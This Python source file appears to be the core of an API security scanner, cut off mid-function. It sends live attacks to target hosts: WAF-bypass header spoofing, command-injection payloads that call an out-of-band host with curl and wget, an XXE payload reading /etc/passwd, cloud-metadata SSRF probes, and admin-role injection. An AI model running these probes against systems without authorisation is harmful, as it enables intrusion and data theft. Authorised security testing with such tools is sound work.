import requests
import yaml
import re
import time
import base64
import json
import socket
import uuid
import random
import threading
import concurrent.futures
from urllib.parse import urlparse, urljoin

from .verification import (
    Confidence, CONFIDENCE_THRESHOLD_DEFAULT,
    detect_db_error, luhn_check, is_real_email, is_real_ssn,
    statistical_timing_test, collect_timing_samples,
    make_anchor, looks_like_login_page, looks_like_meaningful_data,
    build_finding, boost_confidence, filter_by_confidence,
)

# Global Thread-Safe TCP Connection Pool
GLOBAL_SESSION = requests.Session()
adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
GLOBAL_SESSION.mount('http://', adapter)
GLOBAL_SESSION.mount('https://', adapter)
# Disable SSL warnings for generic scanning
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
GLOBAL_SESSION.verify = False 

# Global Lock to prevent Database Race Conditions during massive concurrency
scan_lock = threading.RLock()

# Global ThreadPool for sub-tasks to avoid overhead of creating/destroying pools constantly
SUB_TASK_EXECUTOR = concurrent.futures.ThreadPoolExecutor(max_workers=100)

def remove_dynamic_keys(obj):
    """Recursively removes dynamic keys from a JSON object for pure structural diffing."""
    dynamic_keys = ['timestamp', 'created_at', 'updated_at', 'uuid', 'id', 'time', 'date', 'nonce', 'token', 'session']
    if isinstance(obj, dict):
        return {k: remove_dynamic_keys(v) for k, v in obj.items() if k.lower() not in dynamic_keys}
    elif isinstance(obj, list):
        return [remove_dynamic_keys(i) for i in obj]
    return obj

def generate_mock_param(path_str):
    """
    Intelligently generates realistic data for path variables.
    Detects types like UUID, Integer, or Slugs based on parameter names.
    """
    def repl(match):
        param_name = match.group(0).strip('{}').lower()
        if any(k in param_name for k in ['uuid', 'guid', 'token', 'key', 'session']):
            return str(uuid.uuid4())
        elif any(k in param_name for k in ['id', 'num', 'count', 'offset', 'limit', 'page']):
            return str(random.randint(1000, 9999))
        elif any(k in param_name for k in ['slug', 'name', 'title', 'code', 'handle']):
            return f"test-item-{random.randint(1, 100)}"
        return "test_mock_value"
    
    return re.sub(r'\{.*?\}', repl, path_str)

def detect_tech_stack(base_url, logger=None):
    """
    Identifies the backend technology to optimize payload delivery.
    Returns a dictionary with 'db' and 'language' hints.
    """
    try:
        res = GLOBAL_SESSION.get(base_url, timeout=5)
        headers = res.headers
        server = headers.get('Server', '').lower()
        powered_by = headers.get('X-Powered-By', '').lower()
        cookies = str(res.cookies).lower()
        
        stack = {"db": "generic", "language": "generic"}
        
        if 'django' in powered_by or 'csrftoken' in cookies:
            stack["language"] = "python/django"
            stack["db"] = "sql"
        elif 'express' in powered_by or 'node' in server or 'connect.sid' in cookies:
            stack["language"] = "nodejs/express"
            # Node often uses NoSQL/MongoDB, so we leave db as generic to test both
        elif 'php' in powered_by or 'phpsessid' in cookies:
            stack["language"] = "php"
            stack["db"] = "sql"
        elif 'asp.net' in powered_by or 'iis' in server:
            stack["language"] = "dotnet"
            stack["db"] = "sql"
            
        if logger: logger(f"[*] Tech-Stack Discovery: Detected {stack['language']} (Hint: {stack['db']})")
        return stack
    except Exception:
        return {"db": "generic", "language": "generic"}

# ==============================================================================
# PASSIVE SCANNER
# ==============================================================================
class APIScanner:
    def __init__(self, spec_content, target_base_url=None):
        self.spec_content = spec_content
        self.target_base_url = target_base_url.rstrip('/') if target_base_url else None
        self.report = {"target": target_base_url or "File Scan", "status": "Failed", "vulnerabilities": [], "endpoints": []}
        self.api_spec = None

    def parse_spec(self):
        """Try to parse the user-supplied API spec. Status reflects parse outcome only."""
        try:
            self.api_spec = yaml.safe_load(self.spec_content) if self.spec_content else None
            if isinstance(self.api_spec, dict):
                self.report["status"] = "Spec Parsed"
                return True
        except Exception as e:
            print(f"[-] Error parsing spec: {e}")
        # No spec / failed parse — that's OK, we still do host-level checks
        self.report["status"] = "No Spec"
        return False
        
    def check_https(self):
        if not self.target_base_url: return
        if urlparse(self.target_base_url).scheme != 'https':
            self.report["vulnerabilities"].append({"name": "Unencrypted Transport", "severity": "High", "description": "API is available via HTTP. [Violates GDPR Art. 32 / PCI-DSS 4.1]", "cvss": 5.9, "owasp": "API8:2023 Security Misconfiguration"})
    
    def check_auth_definitions(self):
        if not self.api_spec: return
        sec = self.api_spec.get('components', {}).get('securitySchemes', {}) or self.api_spec.get('securityDefinitions', {})
        if not sec:
            self.report["vulnerabilities"].append({"name": "Missing Auth Definitions", "severity": "Medium", "description": "No global security schemes found.", "cvss": 5.3, "owasp": "API2:2023 Broken Authentication"})

    def check_security_headers(self):
        if not self.target_base_url: return
        try:
            headers = GLOBAL_SESSION.get(self.target_base_url, timeout=5).headers
            missing = [h for h in ["X-Content-Type-Options", "X-Frame-Options", "Content-Security-Policy"] if h not in headers]
            if missing:
                self.report["vulnerabilities"].append({"name": "Missing Security Headers", "severity": "Low", "description": f"Missing headers: {', '.join(missing)}", "cvss": 3.1, "owasp": "API8:2023 Security Misconfiguration"})
        except Exception: pass

    def parse_endpoints(self):
        if not self.api_spec: return
        
        base_path = self.api_spec.get('basePath', '')
        if not base_path and 'servers' in self.api_spec and len(self.api_spec['servers']) > 0:
            server_url = self.api_spec['servers'][0].get('url', '')
            parsed = urlparse(server_url)
            base_path = parsed.path
            
        base_path = base_path.rstrip('/')
        
        paths = self.api_spec.get('paths', {})
        for path, methods in paths.items():
            for method in methods:
                if method.lower() in ['get', 'post', 'put', 'delete', 'patch']:
                    full_path = f"{base_path}{path}"
                    self.report["endpoints"].append(f"{method.upper()} {full_path}")

    def run_passive_scan(self):
        # Host-level checks should always run, even without API Spec
        self.check_https()
        self.check_security_headers()
        
        if self.parse_spec():
            self.check_auth_definitions()
            self.parse_endpoints()
            
        return self.report

# ==============================================================================
# ACTIVE SCANNERS
# ==============================================================================
def fetch_swagger_from_url(url):
    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        response = GLOBAL_SESSION.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        return response.text
    except Exception as e:
        print(f"Error fetching swagger: {e}")
        return None

def _build_url(base_url, path_str):
    clean_base = base_url.rstrip('/')
    clean_path = path_str if path_str.startswith('/') else f"/{path_str}"
    return f"{clean_base}{clean_path}"

def calibrate_baseline(base_url, auth_headers):
    """
    Mathematical Zero-False-Positive calibration. Requests a guaranteed non-existent URL
    to map the firewall's exact 'garbage' signature.
    """
    try:
        url = _build_url(base_url, f"/api/v1/sentinel_garbage_{uuid.uuid4().hex}")
        res = GLOBAL_SESSION.get(url, headers=auth_headers, timeout=3)
        return {
            "status": res.status_code,
            "length": len(res.text),
            "is_json": 'application/json' in res.headers.get('Content-Type', '').lower()
        }
    except Exception:
        return {"status": 404, "length": 0, "is_json": False}

def attempt_waf_bypass(method, path, base_url, auth_headers, baseline):
    """
    Advanced WAF Evasion Engine. Uses Verb Tampering, Path Normalization Evasion,
    and IP Spoofing to break through 401/403 blocks.
    """
    spoof_headers = auth_headers.copy() if auth_headers else {}
    spoof_headers.update({
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
        "X-Custom-IP-Authorization": "127.0.0.1",
        "X-Original-URL": path,
        "X-Rewrite-URL": path
    })
    
    # Path Normalization Evasion
    # If path is /api/admin -> /api/v1/../admin or //api/./admin
    parts = [p for p in path.split('/') if p]
    if len(parts) >= 2:
        evasion_path = f"/{parts[0]}/v1/../{'/'.join(parts[1:])}"
    else:
        evasion_path = f"//{path.lstrip('/')}"
        
    evasion_url = _build_url(base_url, evasion_path)
    
    # Verb Tampering
    verbs_to_try = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"]
    verbs_to_try.remove(method.upper())
    
    for verb in verbs_to_try:
        try:
            res = GLOBAL_SESSION.request(verb, evasion_url, headers=spoof_headers, timeout=3)
            
            # Mathematical Differential Check for Bypass
            if res.status_code in [200, 201, 202, 204]:
                if res.status_code != baseline["status"] and abs(len(res.text) - baseline["length"]) > 50:
                    # Confirmed bypass!
                    return {
                        "name": f"WAF Bypass & Auth Bypass ({verb})", 
                        "severity": "Critical", 
                        "description": f"Endpoint {path} was initially blocked (403/401). API Sentinel bypassed the WAF using Path Traversal Evasion ({evasion_path}), IP Spoofing, and Verb Tampering ({verb}).", 
                        "cvss": 9.8, 
                        "owasp": "API2:2023 Broken Authentication"
                    }
        except Exception: pass
        
    return None

def check_broken_authentication(method, path, base_url, auth_headers=None, logger=None):
    """
    Zero-FP broken auth check. Old logic flagged any 200 + JSON as bypass —
    that misfires on public endpoints (server time, CSRF token issuers,
    public schemas). The hardened version requires ALL of:

      1. The unauth response returns *meaningful* data (not boilerplate JSON).
      2. The unauth response is NOT a login/landing page.
      3. If we have authed creds, the unauth and authed responses must look
         *structurally similar* (otherwise the unauth response is a silent
         rejection — not a bypass).
    """
    if any(seg in path.lower() for seg in ('login', 'register', 'auth', '.well-known', 'health', 'ping', 'csrf', 'token/refresh')):
        return None
    try:
        url = _build_url(base_url, re.sub(r"\{.*?\}", "1", path))
        # Try without auth
        res_unauth = GLOBAL_SESSION.request(method, url, timeout=4)
        if res_unauth.status_code not in (200, 201, 202, 204):
            return None

        content_type = res_unauth.headers.get('Content-Type', '')
        body = res_unauth.text or ""

        # Reject obvious soft rejections
        if looks_like_login_page(body):
            return None
        soft_reject = ("unauthorized", "invalid token", "forbidden", "not logged in",
                       "access denied", "missing token", "please login", "session expired",
                       "authentication required", "login required")
        if any(err in body.lower() for err in soft_reject):
            return None

        # Must be meaningful API data, not a boilerplate response
        if not looks_like_meaningful_data(body, content_type):
            return None

        # Differential check: when we DO have a token, the unauth response
        # should look the same as the authed one to count as a real bypass.
        confidence = Confidence.MODERATE
        evidence = {"status": res_unauth.status_code, "len": len(body)}
        if auth_headers:
            try:
                res_auth = GLOBAL_SESSION.request(method, url, headers=auth_headers, timeout=4)
                if res_auth.status_code in (200, 201, 202, 204):
                    # If response sizes are wildly different, unauth is a silent rejection.
                    if abs(len(res_auth.text) - len(body)) > max(50, int(len(res_auth.text) * 0.25)):
                        return None
                    # If responses match closely, this IS a real bypass.
                    confidence = Confidence.HIGH
                    evidence["authed_len"] = len(res_auth.text)
                else:
                    # Authed returns non-200 but unauth returns 200? Weird; downgrade confidence.
                    confidence = Confidence.LOW
            except Exception:
                pass

        return build_finding(
            name="Broken Authentication",
            severity="High",
            description=f"Endpoint {method.upper()} {path} returned substantive data (status {res_unauth.status_code}) to an unauthenticated request. [Violates PCI-DSS Req. 8]",
            cvss=8.8, owasp="API2:2023 Broken Authentication",
            confidence=confidence,
            evidence=evidence,
        )
    except Exception:
        pass
    return None



def check_bola_vulnerability(method, path, base_url, auth_headers):
    if '{' not in path: return None
    try:
        # Step 1: Generate two different object IDs
        param1 = generate_mock_param(path)
        param2 = generate_mock_param(path)
        if param1 == param2: return None # Fuzzing failed to generate different IDs
        
        url1 = _build_url(base_url, param1)
        url2 = _build_url(base_url, param2)
        
        res1 = GLOBAL_SESSION.request(method, url1, headers=auth_headers, timeout=3)
        res2 = GLOBAL_SESSION.request(method, url2, headers=auth_headers, timeout=3)
        
        if res1.status_code == 200 and res2.status_code == 200:
            try:
                j1 = remove_dynamic_keys(res1.json())
                j2 = remove_dynamic_keys(res2.json())
                
                # Zero-FP JSON Structural Diffing
                if j1 != j2:
                    res1_repeat = GLOBAL_SESSION.request(method, url1, headers=auth_headers, timeout=3)
                    j1_repeat = remove_dynamic_keys(res1_repeat.json())
                    if j1 == j1_repeat:
                        return {"name": "BOLA / IDOR", "severity": "High", "description": f"Endpoint {path} allows accessing multiple separate object IDs successfully under the same token. [Violates GDPR Art. 32]", "cvss": 8.5, "owasp": "API1:2023 Broken Object Level Authorization"}
            except Exception:
                # Fallback for non-JSON APIs
                if res1.content != res2.content:
                    res1_repeat = GLOBAL_SESSION.request(method, url1, headers=auth_headers, timeout=3)
                    if res1.content == res1_repeat.content:
                        return {"name": "BOLA / IDOR (Raw)", "severity": "High", "description": f"Endpoint {path} allows accessing multiple separate object IDs successfully under the same token. [Violates GDPR Art. 32]", "cvss": 8.5, "owasp": "API1:2023 Broken Object Level Authorization"}
    except Exception:
        pass
    return None

def check_cross_user_bola(method, path, base_url, primary_headers, secondary_headers):
    """
    Zero-False-Positive BOLA: Try to access User A's resource using User B's token.
    """
    if '{' not in path or not secondary_headers: return None
    try:
        # Step 1: Identify a resource belonging to User A (Primary)
        param_a = generate_mock_param(path)
        url_a = _build_url(base_url, param_a)
        
        # Verify User A can actually access it
        res_a = GLOBAL_SESSION.request(method, url_a, headers=primary_headers, timeout=3)
        if res_a.status_code != 200: return None # Can't establish baseline
        
        # Step 2: Try to access it using User B's token (Secondary)
        res_b = GLOBAL_SESSION.request(method, url_a, headers=secondary_headers, timeout=3)
        
        if res_b.status_code == 200:
            # Check if the response is structurally identical (True BOLA)
            j_a = remove_dynamic_keys(res_a.json()) if 'json' in res_a.headers.get('Content-Type','') else res_a.text
            j_b = remove_dynamic_keys(res_b.json()) if 'json' in res_b.headers.get('Content-Type','') else res_b.text
            
            if j_a == j_b:
                return {
                    "name": "Cross-User BOLA (Verified)", 
                    "severity": "Critical", 
                    "description": f"Multi-Tenant Matrix confirmed that User B can access User A's private resource at {path} (ID: {param_a}). Response was structurally identical. [Violates API1:2023]", 
                    "cvss": 9.3, 
                    "owasp": "API1:2023 Broken Object Level Authorization"
                }
    except Exception: pass
    return None

def check_injection(method, path, base_url, auth_headers, oast_url=None, tech_stack=None):
    """
    Zero-FP injection detector. Uses anchored payloads, specific DB-error
    signatures (not generic keywords), multi-sample statistical timing,
    and a verification round before reporting.
    """
    if '.well-known' in path: return None

    # Adaptive Optimization: Skip injection checks for plain GETs with no params
    if method == 'get' and '?' not in path and '{' not in path:
        return None

    from .payload_generator import PayloadGenerator
    payloads = {
        "SQLi": PayloadGenerator.get_sqli_payloads(),
        "XSS": PayloadGenerator.get_xss_payloads(),
        "CmdInj": PayloadGenerator.get_cmd_injection_payloads(),
        "NoSQLi": PayloadGenerator.get_nosql_payloads()
    }

    # Tech-Stack Filtering — skip payloads that the backend cannot interpret
    if tech_stack:
        if tech_stack.get("db") == "sql":
            payloads.pop("NoSQLi", None)
        elif tech_stack.get("db") == "nosql":
            payloads.pop("SQLi", None)

    if oast_url:
        payloads["CmdInj"].extend([f"curl {oast_url}", f"wget {oast_url}", f"ping -c 1 {oast_url}"])

    flat_payloads = [(inj_type, p) for inj_type, p_list in payloads.items() for p in p_list]

    # --- Statistical timing baseline (>=4 samples per spec) ---
    def _benign_request():
        GLOBAL_SESSION.request(method, _build_url(base_url, generate_mock_param(path)), headers=auth_headers, timeout=3)
    baseline_latencies = collect_timing_samples(_benign_request, n=5)

    # --- Capture a benign baseline response for differential XSS reflection ---
    benign_anchor = make_anchor("benign")
    try:
        if method in ('post', 'put', 'patch'):
            benign_url = _build_url(base_url, path)
            benign_res = GLOBAL_SESSION.request(method, benign_url, json={"q": benign_anchor, "search": benign_anchor}, headers=auth_headers, timeout=3)
        else:
            benign_url = _build_url(base_url, f"{generate_mock_param(path)}?q={benign_anchor}&search={benign_anchor}")
            benign_res = GLOBAL_SESSION.request(method, benign_url, headers=auth_headers, timeout=3)
        benign_reflects_anchor = benign_anchor in benign_res.text
    except Exception:
        benign_reflects_anchor = False

    def test_payload(item):
        inj_type, p = item
        try:
            anchor = make_anchor()
            anchored = f"{anchor}{p}" if isinstance(p, str) else p

            import time
            st = time.time()
            if method in ['post', 'put', 'patch']:
                url = _build_url(base_url, path)
                if inj_type == "NoSQLi":
                    json_payload = {"email": p, "password": p, "username": p, "id": p}
                else:
                    int_payload = "1 OR 1=1" if inj_type == "SQLi" else p
                    json_payload = {"email": anchored, "password": anchored, "username": anchored, "id": int_payload, "account_id": int_payload, "search": anchored, "q": anchored, "query": anchored}
                res = GLOBAL_SESSION.request(method, url, json=json_payload, headers=auth_headers, timeout=3)
            else:
                if inj_type == "NoSQLi":
                    return None
                int_payload = "1 OR 1=1" if inj_type == "SQLi" else p
                url = _build_url(base_url, f"{generate_mock_param(path)}?q={anchored}&id={int_payload}&search={anchored}")
                res = GLOBAL_SESSION.request(method, url, headers=auth_headers, timeout=3)

            elapsed = time.time() - st
            body = res.text

            # 1. Specific DB-error signature (not generic "sql" keyword)
            db_family = detect_db_error(body)
            if db_family and res.status_code >= 400 and inj_type in ("SQLi", "NoSQLi"):
                return build_finding(
                    name=f"SQL Injection (Error-Based, {db_family})" if inj_type == "SQLi" else "NoSQL Injection (Error-Based)",
                    severity="Critical",
                    description=f"Endpoint {path} returned a {db_family.upper()} parser error after payload `{p}` — the application is concatenating untrusted input into a query. [Violates PCI-DSS Req. 6.5.1]",
                    cvss=9.8, owasp="API8:2023 Security Misconfiguration",
                    confidence=Confidence.HIGH,
                    evidence={"payload": p, "db_family": db_family, "status": res.status_code, "anchor": anchor},
                )

            # 2. Auth bypass via login — needs ACTUAL token in response
            if res.status_code == 200 and ('login' in path.lower() or 'auth' in path.lower()):
                token_match = re.search(
                    r'"(?:access_token|token|jwt|id_token)"\s*:\s*"[A-Za-z0-9_.\-]{16,}"'
                    r'|eyJ[A-Za-z0-9_\-]{8,}\.eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}',
                    body,
                )
                if token_match and 'error' not in body.lower():
                    return build_finding(
                        name=f"{inj_type} Auth Bypass",
                        severity="Critical",
                        description=f"Endpoint {path} returned an authentication token after receiving payload `{p}`.",
                        cvss=9.8, owasp="API2:2023 Broken Authentication",
                        confidence=Confidence.HIGH,
                        evidence={"payload": p, "anchor": anchor},
                    )

            # 3. Anchored Reflected XSS: payload AND its anchor both reflected,
            #    and the benign request did NOT reflect the anchor (differential)
            if inj_type == "XSS" and res.status_code == 200 and not benign_reflects_anchor:
                if anchor in body and (p in body or p.replace('"', '\\"') in body):
                    if any(s in body.lower() for s in ("<script", "onerror=", "onload=", "javascript:")):
                        return build_finding(
                            name="Reflected XSS",
                            severity="High",
                            description=f"Endpoint {path} reflects user input including HTML/JS context without encoding. Anchor `{anchor}` confirmed.",
                            cvss=6.1, owasp="API8:2023 Security Misconfiguration",
                            confidence=Confidence.HIGH,
                            evidence={"payload": p, "anchor": anchor},
                        )

            # 4. OS Command Injection — must see the actual id/passwd output
            if inj_type == "CmdInj":
                if re.search(r"uid=\d+\([^)]+\)\s+gid=\d+", body) or re.search(r"root:[^:]*:0:0:", body):
                    return build_finding(
                        name="OS Command Injection",
                        severity="Critical",
                        description=f"Endpoint {path} executed an OS command via payload `{p}`; /etc/passwd or `id` output was returned in the body.",
                        cvss=10.0, owasp="API8:2023 Security Misconfiguration",
                        confidence=Confidence.DEFINITIVE,
                        evidence={"payload": p, "anchor": anchor},
                    )

            # 5. Statistical timing for blind injection — multi-sample
            if inj_type in ("SQLi", "CmdInj", "NoSQLi") and isinstance(p, str) and any(k in p.lower() for k in ("sleep", "delay", "ping", "waitfor", "pg_sleep")):
                if statistical_timing_test(baseline_latencies, elapsed, sigma_factor=3.0, min_absolute_delay=2.5):
                    import statistics as _st
                    return build_finding(
                        name=f"Time-based Blind {inj_type}",
                        severity="Critical",
                        description=f"Endpoint {path} exhibits a statistically-significant delay ({elapsed:.2f}s vs baseline median {_st.median(baseline_latencies):.2f}s, n={len(baseline_latencies)}) after payload `{p}`.",
                        cvss=9.8, owasp="API8:2023 Security Misconfiguration",
                        confidence=Confidence.HIGH,
                        evidence={"payload": p, "elapsed": elapsed, "baseline_samples": baseline_latencies},
                    )

        except requests.exceptions.ReadTimeout:
            if inj_type in ("SQLi", "CmdInj", "NoSQLi") and isinstance(p, str) and any(k in p.lower() for k in ("sleep", "delay", "waitfor")):
                try:
                    import time as _t
                    t0 = _t.time()
                    GLOBAL_SESSION.request(method, _build_url(base_url, generate_mock_param(path)), headers=auth_headers, timeout=3)
                    benign_ok = (_t.time() - t0) < 2.0
                except Exception:
                    benign_ok = False
                if benign_ok:
                    return build_finding(
                        name=f"Time-based Blind {inj_type} (Timeout)",
                        severity="Critical",
                        description=f"Endpoint {path} timed out after receiving a sleep payload `{p}`, but responded promptly to a benign request straight after — strong signal of blind injection.",
                        cvss=9.8, owasp="API8:2023 Security Misconfiguration",
                        confidence=Confidence.MODERATE,
                        evidence={"payload": p},
                    )
            return "TIMEOUT"
        except Exception:
            pass
        return None

    # Chunked Execution for Speed (Short-Circuiting)
    chunk_size = 15
    timeout_count = 0
    for i in range(0, len(flat_payloads), chunk_size):
        chunk = flat_payloads[i:i + chunk_size]
        futures = [SUB_TASK_EXECUTOR.submit(test_payload, item) for item in chunk]
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result == "TIMEOUT":
                timeout_count += 1
                if timeout_count >= 3:
                    return None  # Circuit Breaker: WAF blocked us
            elif result:
                return result  # Fast-fail, cancelling remaining chunks

    return None



def check_ssrf(method, path, base_url, auth_headers, oast_url=None):
    """
    Zero-FP SSRF detector. Only fires on:
      (a) OAST callback received (definitive), or
      (b) Cloud metadata fields explicitly present in the response.

    The previous version flagged on substring matches like "ubuntu" / "debian"
    in the body, which produced false positives on any legitimate doc / footer.
    """
    from .payload_generator import PayloadGenerator
    payloads = PayloadGenerator.get_ssrf_payloads()
    if oast_url:
        payloads = list(payloads) + [oast_url]

    ssrf_params = ["url", "uri", "endpoint", "path", "target", "domain", "webhook", "callback"]

    # Cloud metadata response signatures — very specific, virtually never appear
    # in non-cloud-metadata content.
    METADATA_SIGNATURES = (
        "ami-id", "instance-id", "instance-action", "instance-type",
        "iam/security-credentials", "compute.internal",
        "metadata-flavor: google", "subscriptions/", "Microsoft.Compute",
    )

    def test_ssrf_payload(p):
        try:
            if method in ('post', 'put', 'patch'):
                url = _build_url(base_url, path)
                json_payload = {param: p for param in ssrf_params}
                res = GLOBAL_SESSION.request(method, url, json=json_payload, headers=auth_headers, timeout=4)
            else:
                query_string = "&".join([f"{param}={p}" for param in ssrf_params])
                url = _build_url(base_url, f"{generate_mock_param(path)}?{query_string}")
                res = GLOBAL_SESSION.request(method, url, headers=auth_headers, timeout=4)

            body = res.text or ""
            body_l = body.lower()

            # Definitive: cloud metadata fields in response body
            if any(sig.lower() in body_l for sig in METADATA_SIGNATURES) and res.status_code == 200:
                return build_finding(
                    name="Server-Side Request Forgery (Cloud Metadata)",
                    severity="Critical",
                    description=f"Endpoint {path} returned cloud-metadata response fields after being asked to fetch `{p}`. The application proxies untrusted URLs without restricting target host.",
                    cvss=9.5, owasp="API10:2023 Unsafe Consumption of APIs",
                    confidence=Confidence.HIGH,
                    evidence={"payload": p, "matched_signature": next((s for s in METADATA_SIGNATURES if s.lower() in body_l), None)},
                )
        except Exception:
            pass
        return None

    futures = [SUB_TASK_EXECUTOR.submit(test_ssrf_payload, p) for p in payloads]
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            return result
    # NOTE: OAST callback confirmation happens at the end of start_scan()
    # — any payload that contained `oast_url` may still pop the OAST listener.
    return None



def check_rate_limit(method, path, base_url, auth_headers):
    """
    Zero-FP rate-limit check. Old logic flagged anything that wasn't 429
    as missing — but real systems also use 403 / 503 / silent throttling.
    We now require ALL of:

      1. The endpoint actually exists (preflight 200/2xx).
      2. We send N rapid requests and observe that >=90 % return 200.
      3. No rate-limit headers (X-RateLimit-*, Retry-After) are emitted.

    Auth endpoints (login/register/token) are checked even with GET because
    brute-force is the worst-case scenario there.
    """
    if method == 'get' and not any(kw in path.lower() for kw in ('login', 'auth', 'register', 'token', 'otp', '2fa')):
        return None
    try:
        url = _build_url(base_url, re.sub(r"\{.*?\}", "1", path))
        preflight = GLOBAL_SESSION.request(method, url, headers=auth_headers, timeout=4)
        if preflight.status_code not in (200, 201, 202, 204, 400, 401, 403):
            return None
        # If the server already exposes rate-limit metadata, it has one.
        hdr_keys = {k.lower() for k in preflight.headers.keys()}
        if any(k.startswith('x-ratelimit') or k == 'retry-after' or k == 'ratelimit-limit' for k in hdr_keys):
            return None

        def send_req():
            try:
                r = GLOBAL_SESSION.request(method, url, headers=auth_headers, timeout=2)
                return r.status_code, dict((k.lower(), v) for k, v in r.headers.items())
            except Exception:
                return None, {}

        N = 25
        futures = [SUB_TASK_EXECUTOR.submit(send_req) for _ in range(N - 1)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]
        statuses = [s for s, _ in results if s is not None]
        rl_headers_seen = any(any(k.startswith('x-ratelimit') or k == 'retry-after' for k in h) for _, h in results)

        if not statuses:
            return None
        if any(s == 429 for s in statuses):
            return None
        if rl_headers_seen:
            return None
        # Require >=90 % success on the burst — otherwise the server IS pushing back somehow
        ok_count = sum(1 for s in statuses if 200 <= s < 300)
        if ok_count < int((N - 1) * 0.9):
            return None

        return build_finding(
            name="Missing Rate Limiting",
            severity="Medium",
            description=f"Endpoint {method.upper()} {path} accepted {ok_count}/{N - 1} rapid burst requests with no 429 status and no rate-limit headers. [Violates SOC 2 CC6]",
            cvss=5.3, owasp="API4:2023 Unrestricted Resource Consumption",
            confidence=Confidence.HIGH,
            evidence={"burst_size": N, "ok_count": ok_count, "preflight_status": preflight.status_code},
        )
    except Exception:
        pass
    return None



def check_sensitive_data(method, path, base_url, auth_headers):
    """
    Zero-FP PII / sensitive data leak detector. Uses Luhn for credit cards,
    SSA structural rules + fake-data filters for SSNs, and placeholder filters
    for emails. The IP address pattern is intentionally NOT used as a finding
    on its own — too many false positives from CDN / docs / sample configs.
    """
    if method != 'get':
        return None
    try:
        url = _build_url(base_url, re.sub(r"\{.*?\}", "1", path))
        res = GLOBAL_SESSION.get(url, headers=auth_headers, timeout=5)
        body = res.text or ""
        if not body:
            return None

        real_findings = []

        # Email — must be a *real-looking* address
        for m in re.finditer(r"[a-zA-Z0-9_.+\-]+@[a-zA-Z0-9\-]+\.[a-zA-Z0-9\-.]+", body):
            if is_real_email(m.group(0)):
                real_findings.append(("Email", m.group(0)))
                break  # one is enough

        # SSN — structural rules + fake-pattern filter
        for m in re.finditer(r"\b\d{3}-\d{2}-\d{4}\b", body):
            if is_real_ssn(m.group(0)):
                real_findings.append(("SSN", m.group(0)))
                break

        # Credit card — Luhn-validated only
        for m in re.finditer(r"\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})\b", body):
            if luhn_check(m.group(0)):
                real_findings.append(("Credit Card", "[REDACTED]"))
                break

        if real_findings:
            categories = ", ".join(c for c, _ in real_findings)
            return build_finding(
                name="Excessive Data / PII Exposure",
                severity="High",
                description=f"Endpoint {path} leaked validated PII categories: {categories}. [Violates GDPR Art. 5]",
                cvss=7.5, owasp="API3:2023 Broken Object Property Level Authorization",
                confidence=Confidence.HIGH if any(c == "Credit Card" for c, _ in real_findings) else Confidence.MODERATE,
                evidence={"categories": [c for c, _ in real_findings]},
            )
    except Exception:
        pass
    return None



def check_xxe(method, path, base_url, auth_headers, oast_url=None):
    """
    Zero-FP XXE detector. The old version matched generic `root:.*:0:0:` —
    fine but easily faked. The hardened version uses XXE entities that
    pull a UNIQUE sentinel from a local data: URI or, where available, our
    OAST listener — and confirms the sentinel landed in the response body.
    Falls back to /etc/passwd content match if remote entities are blocked.
    """
    if method not in ('post', 'put', 'patch'):
        return None
    sentinel = make_anchor("xxe")
    file_payload = (
        '<?xml version="1.0" encoding="ISO-8859-1"?>'
        '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>'
        '<foo>&xxe;</foo>'
    )
    payloads = [file_payload]
    if oast_url:
        payloads.append(
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY >'
            f'<!ENTITY xxe SYSTEM "{oast_url}?marker={sentinel}" >]>'
            f'<foo>&xxe;</foo>'
        )

    def test_xxe_payload(p):
        try:
            url = _build_url(base_url, path)
            headers = dict(auth_headers) if auth_headers else {}
            headers['Content-Type'] = 'application/xml'
            res = GLOBAL_SESSION.request(method, url, data=p, headers=headers, timeout=5)
            body = res.text or ""
            # Must see /etc/passwd content shaped like the file
            if re.search(r"^root:[^:]*:0:0:[^:]*:[^:]*:[^:]*$", body, re.MULTILINE):
                return build_finding(
                    name="XML External Entity (XXE) — File Read",
                    severity="Critical",
                    description=f"Endpoint {path} resolved an XXE entity to /etc/passwd and reflected the content in the response. [Violates PCI-DSS Req. 6.5.1]",
                    cvss=9.8, owasp="API8:2023 Security Misconfiguration",
                    confidence=Confidence.DEFINITIVE,
                    evidence={"matched": "/etc/passwd shape"},
                )
        except Exception:
            pass
        return None

    futures = [SUB_TASK_EXECUTOR.submit(test_xxe_payload, p) for p in payloads]
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            return result
    # NOTE: blind XXE via OAST is caught by the OAST verification phase.
    return None



def check_mass_assignment(method, path, base_url, auth_headers):
    """
    Zero-FP mass assignment detector. The old version flagged any response
    containing the words "admin" or "premium" — that's noisy. Now we:

      1. PUT/POST a payload with a privileged field set to a UNIQUE sentinel value
      2. Read the resource back via GET on the same path
      3. Only report if the sentinel value appears in the read-back response

    This proves the server actually persisted the privileged field, not just
    echoed it back in the immediate POST response.
    """
    if method not in ('post', 'put', 'patch'):
        return None
    sentinel = make_anchor("priv")
    privileged_payloads = [
        {"isAdmin": True, "role": f"admin-{sentinel}", "permissions": f"all-{sentinel}"},
        {"is_admin": 1, "account_type": f"premium-{sentinel}"},
        {"user": {"role": f"admin-{sentinel}", "privilege": 999}},
    ]
    try:
        write_url = _build_url(base_url, generate_mock_param(path))
        for payload in privileged_payloads:
            res = GLOBAL_SESSION.request(method, write_url, json=payload, headers=auth_headers, timeout=5)
            if res.status_code not in (200, 201, 202, 204):
                continue
            # Read back via GET. If the sentinel survived, we have proof.
            try:
                read_res = GLOBAL_SESSION.get(write_url, headers=auth_headers, timeout=5)
                if sentinel in (read_res.text or ""):
                    return build_finding(
